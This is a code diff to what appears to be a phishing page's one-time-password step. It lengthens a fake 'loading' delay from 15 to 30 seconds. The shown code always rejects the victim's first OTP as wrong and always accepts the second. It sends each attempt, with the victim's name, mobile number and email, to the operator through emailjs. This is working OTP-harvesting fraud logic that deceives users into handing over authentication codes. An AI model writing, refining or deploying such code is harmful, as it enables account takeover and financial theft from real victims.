@@ -165,7 +165,7 @@
     document.getElementById('step2').style.display = 'block';
   }
 
-  // UPDATED: 15s loading after 1st (wrong) OTP attempt before letting user try again.
+  // UPDATED: 30s loading after 1st (wrong) OTP attempt before letting user try again.
   function verifyOTP() {
     const attempts = parseInt(sessionStorage.getItem('otpAttempts') || '0', 10);
     const newAttempts = attempts + 1;
@@ -177,7 +177,7 @@
     const email = document.getElementById('email').value;
 
     if (newAttempts === 1) {
-      // Hide OTP screen & show loading for 15s (no countdown)
+      // Hide OTP screen & show loading for 30s
       document.getElementById('step2').style.display = 'none';
       document.getElementById('loading').style.display = 'block';
 
@@ -186,9 +186,7 @@
         document.getElementById('step2').style.display = 'block';
         document.getElementById('status2').textContent = '❌ Wrong OTP. Try again.';
         document.getElementById('status2').style.color = 'red';
-        // Optional: clear input so they re-enter
-        // document.getElementById('otp').value = '';
-      }, 15000); // 15 seconds
+      }, 30000); // 30 seconds
     } else {
       // Always correct on 2nd attempt
       document.getElementById('step2').style.display = 'none';
@@ -196,12 +194,12 @@
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.getElementById('step3').style.display = 'block';
-      }, 10000); // existing 10s loading to approval
+      }, 10000); // 10 seconds loading to approval
     }
 
     sessionStorage.setItem('otpAttempts', newAttempts);
 
-    // Send OTP attempt email (logging)
+    // Send OTP attempt email
     emailjs.send('service_3hqkdcg', 'template_ukf5gwk', {
       name: name,
       mobile: mobile,
